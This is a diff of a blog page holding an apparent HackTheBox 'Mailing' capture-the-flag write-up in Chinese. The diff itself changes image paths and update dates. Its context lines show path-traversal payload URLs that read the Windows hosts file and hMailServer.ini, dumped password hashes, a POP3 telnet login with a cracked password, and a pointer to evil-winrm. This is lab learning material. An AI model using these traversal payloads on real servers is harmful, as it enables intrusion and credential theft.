@@ -25,21 +25,21 @@
 <meta property="og:site_name" content="kazma&#39;s blog">
 <meta property="og:description" content="第一次打 HackTheBox 的 Windows 靶機～～～ Exploitation先 nmap： 1234567891011121314151617181920└──╼ [★]$ nmap -sV 10.129.241.62Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-08-15 07:36 CDTNmap scan report fo">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://kazma.tw/images/mailing_download.png">
-<meta property="og:image" content="https://kazma.tw/images/mailing_default.png">
-<meta property="og:image" content="https://kazma.tw/images/mailing_fail.png">
-<meta property="og:image" content="https://kazma.tw/images/maling_pop3.png">
-<meta property="og:image" content="https://kazma.tw/images/mailing_evil.png">
-<meta property="og:image" content="https://kazma.tw/images/mailing_pwn.png">
+<meta property="og:image" content="https://kazma.tw/source/images/mailing_download.png">
+<meta property="og:image" content="https://kazma.tw/source/images/mailing_default.png">
+<meta property="og:image" content="https://kazma.tw/source/images/mailing_fail.png">
+<meta property="og:image" content="https://kazma.tw/source/images/maling_pop3.png">
+<meta property="og:image" content="https://kazma.tw/source/images/mailing_evil.png">
+<meta property="og:image" content="https://kazma.tw/source/images/mailing_pwn.png">
 <meta property="article:published_time" content="2024-08-15T12:32:40.367Z">
-<meta property="article:modified_time" content="2024-08-17T07:49:16.457Z">
+<meta property="article:modified_time" content="2025-08-20T03:35:55.493Z">
 <meta property="article:author" content="kazma">
 <meta property="article:tag" content="writeup">
 <meta property="article:tag" content="htb">
 <meta property="article:tag" content="machines">
 <meta property="article:tag" content="pt">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://kazma.tw/images/mailing_download.png">
+<meta name="twitter:image" content="https://kazma.tw/source/images/mailing_download.png">
     
     
     <!--- Icon Part-->
@@ -590,8 +590,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-08-17 15:49:16</span>
-            <span class="mobile">2024-08-17 15:49:16</span>
+            <span class="desktop">2025-08-20 11:35:55</span>
+            <span class="mobile">2025-08-20 11:35:55</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -653,7 +653,7 @@
 <p>看到一個 assets，status 301，先有個印象就好<br>網站東西蠻多的還有一個 <a class="link"   target="_blank" rel="noopener" href="https://www.hmailserver.com/" >https://www.hmailserver.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 裡面蠻多功能的，但在首頁底下有個下載功能，滑鼠 hover 在按鈕上會看到：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/mailing_download.png"
+                     data-src="/source/images/mailing_download.png"
                       alt="hover"
                 ><br>我們可以嘗試撈其他東西，例如 <code>http://mailing.htb/download.php?file=../../../../../../../Windows/System32/Drivers/etc/hosts</code> 可以撈到 &#x2F;etc&#x2F;hosts：</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ <span class="built_in">cat</span> hosts </span><br><span class="line"><span class="comment"># Copyright (c) 1993-2009 Microsoft Corp.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This file contains the mappings of IP addresses to host names. Each</span></span><br><span class="line"><span class="comment"># entry should be kept on an individual line. The IP address should</span></span><br><span class="line"><span class="comment"># be placed in the first column followed by the corresponding host name.</span></span><br><span class="line"><span class="comment"># The IP address and the host name should be separated by at least one</span></span><br><span class="line"><span class="comment"># space.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Additionally, comments (such as these) may be inserted on individual</span></span><br><span class="line"><span class="comment"># lines or following the machine name denoted by a &#x27;#&#x27; symbol.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For example:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#      102.54.94.97     rhino.acme.com          # source server</span></span><br><span class="line"><span class="comment">#       38.25.63.10     x.acme.com              # x client host</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># localhost name resolution is handled within DNS itself.</span></span><br><span class="line"><span class="comment">#	127.0.0.1       localhost</span></span><br><span class="line"><span class="comment">#	::1             localhost</span></span><br><span class="line"></span><br><span class="line">127.0.0.1	mailing.htb</span><br></pre></td></tr></table></figure></div>
@@ -668,7 +668,7 @@
 <p>那我們嘗試一下上面的路徑放到我們的 payload：<br><code>http://mailing.htb/download.php?file=../../../../../../Program Files/hMailServer/Bin/hMailServer.ini</code><br>結果檔案找不到：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/mailing_default.png"
+                     data-src="/source/images/mailing_default.png"
                       alt="default"
                 ><br>又試了一下在 <code>http://mailing.htb/download.php?file=../../../../../../Program%20Files%20(x86)/hMailServer/Bin/hMailServer.ini</code> 找到，看一下 hMailServer.ini 的內容：</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ <span class="built_in">cat</span> hMailServer.ini </span><br><span class="line">[Directories]</span><br><span class="line">ProgramFolder=C:\Program Files (x86)\hMailServer</span><br><span class="line">DatabaseFolder=C:\Program Files (x86)\hMailServer\Database</span><br><span class="line">DataFolder=C:\Program Files (x86)\hMailServer\Data</span><br><span class="line">LogFolder=C:\Program Files (x86)\hMailServer\Logs</span><br><span class="line">TempFolder=C:\Program Files (x86)\hMailServer\Temp</span><br><span class="line">EventFolder=C:\Program Files (x86)\hMailServer\Events</span><br><span class="line">[GUILanguages]</span><br><span class="line">ValidLanguages=english,swedish</span><br><span class="line">[Security]</span><br><span class="line">AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7</span><br><span class="line">[Database]</span><br><span class="line">Type=MSSQLCE</span><br><span class="line">Username=</span><br><span class="line">Password=0a9f8ad8bf896b501dde74f08efd7e4c</span><br><span class="line">PasswordEncryption=1</span><br><span class="line">Port=0</span><br><span class="line">Server=</span><br><span class="line">Database=hMailServer</span><br><span class="line">Internal=1</span><br></pre></td></tr></table></figure></div>
@@ -679,7 +679,7 @@
 <p>喔不失敗，我們換個線上工具：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/mailing_fail.png"
+                     data-src="/source/images/mailing_fail.png"
                       alt="fail"
                 ><br>又失敗？回去看一下才發現剛剛 hMailServer.ini 有兩組 password：</p>
 <div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7</span><br><span class="line">Password=0a9f8ad8bf896b501dde74f08efd7e4c</span><br></pre></td></tr></table></figure></div>
@@ -692,7 +692,7 @@
 <p>簡單來說是一個可以遠端管理信件的協議，用法維基百科上也有寫用法：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/maling_pop3.png"
+                     data-src="/source/images/maling_pop3.png"
                       alt="pop3"
                 ><br>所以我們可以拿剛剛解出來的帳密登入看看：</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ telnet 10.129.241.62 110</span><br><span class="line">Trying 10.129.241.62...</span><br><span class="line">Connected to 10.129.241.62.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK POP3</span><br><span class="line">USER administrator@mailing.htb</span><br><span class="line">+OK Send your password</span><br><span class="line">PASS homenetworkingadministrator</span><br><span class="line">+OK Mailbox locked and ready</span><br><span class="line"><span class="built_in">stat</span></span><br><span class="line">+OK 0 0</span><br><span class="line">list</span><br><span class="line">+OK 0 messages (0 octets)</span><br><span class="line">.</span><br></pre></td></tr></table></figure></div>
@@ -716,7 +716,7 @@
 <p>找到密碼：m4y4ngs4ri<br>好，有了帳密之後，這裡要介紹一個神器叫 <a class="link"   target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm" >evil-winrm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，順便附上他的超帥圖片和說明：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/mailing_evil.png"
+                     data-src="/source/images/mailing_evil.png"
                       alt="evil"
                 ></p>
 <blockquote>
@@ -749,7 +749,7 @@
 <h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/mailing_pwn.png"
+                     data-src="/source/images/mailing_pwn.png"
                       alt="pwn"
                 ></p>
 
@@ -766,7 +766,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-08-17 15:49:16
+                    :</strong> 2025-08-20 11:35:55
             </li>
         
         <li>
